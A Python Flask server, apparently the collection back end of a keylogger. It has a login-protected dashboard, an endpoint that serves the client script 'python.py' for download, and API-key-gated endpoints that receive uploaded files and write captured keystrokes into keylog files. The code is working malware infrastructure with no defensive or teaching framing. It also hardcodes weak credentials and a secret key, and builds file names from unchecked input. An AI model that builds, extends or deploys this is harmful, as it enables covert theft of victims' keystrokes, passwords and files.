from flask import Flask, request, jsonify, send_file, render_template, redirect, url_for
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user
import os
from werkzeug.utils import secure_filename
from datetime import datetime

app = Flask(__name__)
app.secret_key = "your_secret_key_123"
login_manager = LoginManager()
login_manager.init_app(app)

UPLOAD_FOLDER = "uploads"
ALLOWED_EXTENSIONS = {"txt", "png"}
app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

users = {"admin": {"password": "admin123", "api_key": "12345"}}

class User(UserMixin):
    def __init__(self, username):
        self.id = username

@login_manager.user_loader
def load_user(username):
    if username in users:
        return User(username)
    return None

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        if username in users and users[username]["password"] == password:
            user = User(username)
            login_user(user)
            return redirect(url_for("dashboard"))
        return "Credenciales inválidas"
    return render_template("login.html")

@app.route("/dashboard")
@login_required
def dashboard():
    import socket
    hostname = socket.gethostname()
    server_ip = socket.gethostbyname(hostname)
    server_url = f"http://{server_ip}:5000"
    return render_template("dashboard.html", api_key=users["admin"]["api_key"], server_url=server_url)

@app.route("/download")
@login_required
def download():
    return send_file("python.py", as_attachment=True)

@app.route("/upload", methods=["POST"])
def upload():
    api_key = request.headers.get("Authorization", "").replace("Bearer ", "")
    if api_key not in [u["api_key"] for u in users.values()]:
        return jsonify({"error": "API key inválida"}), 401

    for file_key, file in request.files.items():
        if file and file.filename.rsplit(".", 1)[1].lower() in ALLOWED_EXTENSIONS:
            filename = secure_filename(file.filename)
            file.save(os.path.join(app.config["UPLOAD_FOLDER"], filename))
    return jsonify({"message": "Archivos recibidos"})

@app.route("/upload_keys", methods=["POST"])
def upload_keys():
    api_key = request.headers.get("Authorization", "").replace("Bearer ", "")
    if api_key not in [u["api_key"] for u in users.values()]:
        return jsonify({"error": "API key inválida"}), 401

    data = request.get_json()
    if not data or "keys" not in data or "timestamp" not in data:
        return jsonify({"error": "Datos inválidos"}), 400

    timestamp = data["timestamp"].replace(":", "-").replace(" ", "_")
    filename = f"keylog_{timestamp}.txt"
    filepath = os.path.join(app.config["UPLOAD_FOLDER"], filename)
    try:
        with open(filepath, "a", encoding="utf-8") as f:
            for key_entry in data["keys"]:
                f.write(key_entry + "\n")
        return jsonify({"message": "Teclas recibidas"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/logout")
@login_required
def logout():
    logout_user()
    return redirect(url_for("login"))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)